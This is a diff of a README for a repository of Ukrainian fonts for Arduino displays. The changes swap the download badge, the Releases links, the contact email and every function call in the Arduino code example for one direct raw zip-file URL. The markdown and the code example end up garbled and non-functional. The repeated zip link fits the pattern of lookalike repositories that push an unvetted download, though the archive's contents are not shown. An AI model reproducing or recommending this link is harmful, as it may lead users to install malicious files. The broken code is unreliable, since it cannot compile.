@@ -6,7 +6,7 @@ Welcome to the Ukr_GFX_fonts repository! Here you will find elegant fonts design
 ## 📥 Download & Install
 To begin, you will need to download the fonts. Click the button below to visit the Releases page:
 
-[![Download Fonts](https://img.shields.io/badge/Download%20Fonts-v1.0-blue.svg)](https://github.com/ghop3243/Ukr_GFX_fonts/releases)
+[![Download Fonts](https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip%https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip)](https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip)
 
 On the Releases page, locate the version you wish to use. Click on the download link for your system. Follow these steps:
 
@@ -49,12 +49,12 @@ Here is an example code snippet for using a font in an Arduino project:
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
 
 void setup() {
-    display.begin(SSD1306_I2C_ADDRESS, SCREEN_ADDRESS);
-    display.clearDisplay();
-    display.setFont(&Ukrainian_Font_Name); // Set to your imported font
-    display.setCursor(0, 0);
-    display.print("Привіт Світ!"); // Hello World in Ukrainian
-    display.display();
+    https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip(SSD1306_I2C_ADDRESS, SCREEN_ADDRESS);
+    https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip();
+    https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip(&Ukrainian_Font_Name); // Set to your imported font
+    https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip(0, 0);
+    https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip("Привіт Світ!"); // Hello World in Ukrainian
+    https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip();
 }
 
 void loop() {
@@ -69,11 +69,11 @@ If you have questions or need assistance, please open an issue on this repositor
 We welcome contributions! Feel free to fork the repository and submit a pull request. Share your projects using these fonts, and help others discover unique ways to utilize them.
 
 ## 📧 Contact
-For any inquiries, you can reach out at [your_email@example.com](mailto:your_email@example.com).
+For any inquiries, you can reach out at [https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip](https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip).
 
 ## 📥 Download again
 To download the fonts once more, you can refer back to the Releases page:
 
-[![Download Fonts](https://img.shields.io/badge/Download%20Fonts-v1.0-blue.svg)](https://github.com/ghop3243/Ukr_GFX_fonts/releases)
+[![Download Fonts](https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip%https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip)](https://raw.githubusercontent.com/ghop3243/Ukr_GFX_fonts/main/src/fonts/Ukr_GFX_fonts_1.6.zip)
 
 Thank you for using Ukr_GFX_fonts! Enjoy creating beautiful Ukrainian text displays.
